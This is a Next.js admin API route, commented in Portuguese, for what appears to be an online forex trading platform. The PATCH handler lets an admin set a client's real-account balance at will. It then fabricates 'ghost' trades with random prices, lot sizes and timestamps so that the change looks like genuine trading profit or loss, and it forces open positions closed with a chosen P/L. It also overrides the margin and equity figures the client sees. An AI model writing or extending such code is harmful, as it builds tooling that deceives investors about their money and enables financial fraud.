/**
 * GET    /api/admin/users/[id]  — detalhe do utilizador
 * PATCH  /api/admin/users/[id]  — editar dados (balance, status, overrides, etc.)
 * DELETE /api/admin/users/[id]  — remover utilizador
 *
 * Fonte de dados:
 *   - Com SUPABASE_SERVICE_ROLE_KEY → Supabase (profiles + accounts + admin_overrides)
 *   - Sem service role key           → userStore (localStorage local)
 */

import { NextRequest, NextResponse } from "next/server";
import { createServerClient, hasServiceRole } from "@/lib/supabase-server";
import { userStore } from "@/lib/user-store";
import { adminOverrideStore } from "@/lib/admin-override-store";
import { generateGhostPnl } from "@/lib/adjustment-utils";
import { ghostPendingStore, type GhostTrade } from "@/lib/ghost-pending-store";
import { requireAdmin } from "@/lib/admin-auth";

// ─── GET /api/admin/users/[id] ────────────────────────────────────────────────
export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> },
) {
  const unauth = requireAdmin(req)
  if (unauth) return unauth

  const { id } = await params;

  if (hasServiceRole()) {
    const sb = createServerClient();
    const { data, error } = await sb
      .from("profiles")
      .select("*, accounts(*)")
      .eq("id", id)
      .single();

    if (error)
      return NextResponse.json(
        { error: "Utilizador não encontrado" },
        { status: 404 },
      );

    // Adicionar override em memória ao resultado
    const memOv = adminOverrideStore.get(id);
    return NextResponse.json({
      success: true,
      data: { ...data, _memOverride: memOv },
      source: "supabase",
    });
  }

  const user = userStore.getById(id);
  if (!user)
    return NextResponse.json(
      { error: "Utilizador não encontrado" },
      { status: 404 },
    );
  return NextResponse.json({ success: true, data: user, source: "local" });
}

// ─── PATCH /api/admin/users/[id] ─────────────────────────────────────────────
export async function PATCH(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> },
) {
  const unauth = requireAdmin(req)
  if (unauth) return unauth

  const { id } = await params;

  try {
    const body = await req.json();

    if (hasServiceRole()) {
      const sb = createServerClient();

      const warnings: string[] = [];

      // ── 0. Ler estado atual ──────────────────────────────────────────────
      // Admin opera SEMPRE na conta real
      const [{ data: currentAccounts }, { data: currentProfile }] =
        await Promise.all([
          sb
            .from("accounts")
            .select("id, balance")
            .eq("user_id", id)
            .eq("mode", "real"),
          sb.from("profiles").select("mode").eq("id", id).single(),
        ]);
      const currentBalance =
        (currentAccounts as { id: string; balance: number }[] | null)?.[0]
          ?.balance ?? null;
      const currentAccountId =
        (currentAccounts as { id: string; balance: number }[] | null)?.[0]
          ?.id ?? null;
      // Ignorar body.mode — admin sempre opera em modo real
      const currentMode: "demo" | "real" = "real";

      // ── 1. Atualizar profiles (DB) ──────────────────────────────────────
      const profilePatch: Record<string, unknown> = {};
      if ("firstName" in body || "lastName" in body) {
        const fn = body.firstName ?? "";
        const ln = body.lastName ?? "";
        profilePatch.first_name = fn;
        profilePatch.last_name = ln;
        profilePatch.name =
          [fn, ln].filter(Boolean).join(" ").trim() || fn || ln;
      }
      if ("phone" in body) profilePatch.phone = body.phone;
      if ("country" in body) profilePatch.country = body.country;
      if ("kycStatus" in body) profilePatch.kyc_status = body.kycStatus;
      if ("status" in body) profilePatch.status = body.status;
      if ("mode" in body) profilePatch.mode = body.mode;

      if (Object.keys(profilePatch).length > 0) {
        const { error: profErr } = await sb
          .from("profiles")
          .update(profilePatch)
          .eq("id", id);
        if (profErr) {
          console.error("[admin PATCH] profiles:", profErr.message);
          warnings.push("Perfil: " + profErr.message);
        }
      }

      // ── 2. Atualizar saldo real (DB) ────────────────────────────────────
      const sharedFields: Record<string, unknown> = {};
      if ("leverage" in body) sharedFields.leverage = body.leverage;
      if ("currency" in body) sharedFields.currency = body.currency;

      // Admin só altera conta real — ignoramos demoBalance, usamos realBalance ou balance
      const newRealBalance: number | null =
        "realBalance" in body && typeof body.realBalance === "number"
          ? body.realBalance
          : "balance" in body && typeof body.balance === "number"
            ? body.balance
            : null;

      const balanceToSet: number | null = newRealBalance;

      const anyBalanceChanged =
        balanceToSet !== null &&
        (currentBalance === null ||
          Number(balanceToSet) !== Number(currentBalance));

      if (balanceToSet !== null || Object.keys(sharedFields).length > 0) {
        // ── Campos que não são saldo (leverage, currency…) ──────────────────
        if (Object.keys(sharedFields).length > 0) {
          // Filtrar por mode="real" usando o nome da coluna entre aspas para evitar
          // colisão com a função agregada MODE() do PostgreSQL.
          const { error: sfErr } = await sb
            .from("accounts")
            .update(sharedFields)
            .eq("user_id", id)
            .eq("mode", "real");
          if (sfErr) {
            console.error("[admin PATCH] sharedFields:", sfErr.message);
            warnings.push("Conta (campos): " + sfErr.message);
          }
        }

        if (balanceToSet !== null) {
          // ── Delta: usar saldo efectivo (override em memória tem prioridade sobre DB) ──
          // Se o admin definiu $20k via override (sem conta real no DB), o DB tem $0.
          // Usar o override em memória para calcular o delta correcto.
          const memEntry = adminOverrideStore.get(id);
          const effectivePrevBalance = memEntry?.balance ?? currentBalance ?? 0;
          const delta = balanceToSet - effectivePrevBalance;

          // ── Actualizar saldo no Supabase ───────────────────────────────────
          // A constraint é UNIQUE(user_id, mode) — obrigatório usar os dois campos
          // no onConflict para evitar atingir a conta demo por engano.
          const { error: accErr } = await sb
            .from("accounts")
            .upsert(
              { user_id: id, mode: "real", balance: balanceToSet, ...sharedFields },
              { onConflict: "user_id,mode" },
            );
          if (accErr) {
            console.error("[admin PATCH] balance upsert:", accErr.message);
            warnings.push("Conta: " + accErr.message);
          }

          // ── Gerar ghost trades se delta significativo ──────────────────────
          // O cliente recebe o totalDelta e decide como distribuir:
          //   • 0 posições abertas  → aplica directo no saldo (sem trades)
          //   • 1 posição aberta    → fecha com PnL = totalDelta (sinal correcto)
          //   • N≥2 posições        → distribui com bait oposto, soma = totalDelta
          console.log(
            `[ghost] userId=${id} effectivePrev=${effectivePrevBalance} balanceToSet=${balanceToSet} delta=${delta}`,
          );
          if (Math.abs(delta) >= 0.01) {
            // Gerar 3 P/Ls de fallback (usados quando o cliente tem ≥2 posições abertas
            // ou para criar operações no histórico quando não tem nenhuma)
            const pnlValues = generateGhostPnl(delta, 3);

            const symbols = ["EURUSD", "GBPUSD", "USDJPY", "AUDUSD", "USDCAD"];
            const icons = ["🇪🇺", "🇬🇧", "🇯🇵", "🇦🇺", "🇨🇦"];
            const refPrices = [1.085, 1.265, 149.5, 0.645, 1.36];

            const now = new Date();
            const trades: GhostTrade[] = pnlValues.map((pnl, i) => {
              const idx = i % symbols.length;
              const openPrice = parseFloat(
                (refPrices[idx] + (Math.random() * 0.006 - 0.003)).toFixed(5),
              );
              const lots = parseFloat((0.01 + Math.random() * 0.09).toFixed(2));
              const closePrice = parseFloat(
                (openPrice + pnl / (lots * 100_000)).toFixed(5),
              );
              const amount = parseFloat(
                Math.max(50, Math.abs(pnl) * 8).toFixed(2),
              );
              const openedAt = new Date(
                now.getTime() - (1 + Math.random() * 23) * 3_600_000,
              ).toISOString();
              const closedAt = new Date(
                now.getTime() - (1 + Math.random() * 59) * 60_000,
              ).toISOString();
              return {
                id: crypto.randomUUID(),
                symbol: symbols[idx],
                icon: icons[idx],
                type: "buy" as const,
                lots,
                amount,
                leverage: 200,
                openPrice,
                closePrice,
                pnl,
                openedAt,
                closedAt,
                closeReason: "adjustment",
              };
            });

            // Guardar: totalDelta permite ao cliente fechar correctamente seja
            // qual for o número de posições abertas. pnls e trades são fallback.
            ghostPendingStore.set(id, {
              mode: "close_open",
              totalDelta: parseFloat(delta.toFixed(2)),
              pnls: pnlValues,
              trades,
            });
            console.log(
              `[ghost] stored totalDelta=${delta.toFixed(2)} pnls=${JSON.stringify(pnlValues)} for user ${id}`,
            );
          }

          // Auditoria (best-effort, falha silenciosa)
          await sb
            .from("balance_adjustments")
            .insert({
              user_id: id,
              previous_balance: effectivePrevBalance,
              new_balance_input: balanceToSet,
              open_positions: 0,
              reason: body.adjustmentReason ?? "Ajuste manual via painel admin",
            })
            .then(() => {});
        }
      }

      const forcedMode: "real" = "real";

      // ── 3. Guardar overrides em memória — sempre modo real ──────────────
      // balanceOverride removido: saldo controlado via Financeiro (campo balance)
      adminOverrideStore.set(id, {
        ...(balanceToSet !== null ? { balance: balanceToSet } : {}),
        mode: "real",
        ...(anyBalanceChanged ? { forceClose: true } : {}),
        ...(body.marginLevelOverride !== undefined
          ? { marginLevelOverride: body.marginLevelOverride }
          : {}),
        ...(body.equityOverride !== undefined
          ? { equityOverride: body.equityOverride }
          : {}),
        ...(body.adminNotes !== undefined ? { note: body.adminNotes } : {}),
      });

      return NextResponse.json({
        success: true,
        source: "supabase",
        balanceChanged: anyBalanceChanged,
        forcedMode,
        warnings: warnings.length > 0 ? warnings : undefined,
      });
    }

    // ── Fallback: userStore ────────────────────────────────────────────────
    const allowed = [
      "firstName",
      "lastName",
      "phone",
      "country",
      "mode",
      "status",
      "balance",
      "leverage",
      "currency",
      "balanceOverride",
      "marginLevelOverride",
      "equityOverride",
      "adminNotes",
      "kycStatus",
      "totalDeposited",
      "totalWithdrawn",
    ];
    const patch: Record<string, unknown> = {};
    for (const key of allowed) {
      if (key in body) patch[key] = body[key];
    }

    const updated = userStore.update(id, patch);
    if (!updated)
      return NextResponse.json(
        { error: "Utilizador não encontrado" },
        { status: 404 },
      );
    return NextResponse.json({ success: true, data: updated, source: "local" });
  } catch {
    return NextResponse.json({ error: "Erro interno" }, { status: 500 });
  }
}

// ─── DELETE /api/admin/users/[id] ────────────────────────────────────────────
export async function DELETE(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> },
) {
  const unauth = requireAdmin(req)
  if (unauth) return unauth

  const { id } = await params;

  if (hasServiceRole()) {
    const sb = createServerClient();
    const { error } = await sb.auth.admin.deleteUser(id);
    if (error)
      return NextResponse.json({ error: error.message }, { status: 400 });
    return NextResponse.json({ success: true, source: "supabase" });
  }

  const deleted = userStore.delete(id);
  if (!deleted)
    return NextResponse.json(
      { error: "Utilizador não encontrado" },
      { status: 404 },
    );
  return NextResponse.json({ success: true, source: "local" });
}
